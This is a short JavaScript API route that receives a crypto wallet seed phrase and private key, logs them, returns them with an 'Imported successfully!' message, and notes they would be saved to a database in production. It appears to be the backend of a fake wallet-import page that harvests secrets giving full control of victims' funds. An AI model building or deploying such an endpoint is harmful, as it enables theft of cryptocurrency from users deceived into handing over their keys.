// api/storeData.js
export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { seedPhrase, privateKey } = req.body;

        // Simulate saving the data (In production, connect to a database like Firebase or MongoDB)
        console.log("Received Data:", { seedPhrase, privateKey });

        // Send a response back to the client
        res.status(200).json({ message: "Imported successfully!", data: { seedPhrase, privateKey } });
    } else {
        res.setHeader("Allow", ["POST"]);
        res.status(405).end(`Method ${req.method} Not Allowed`);
    }
}
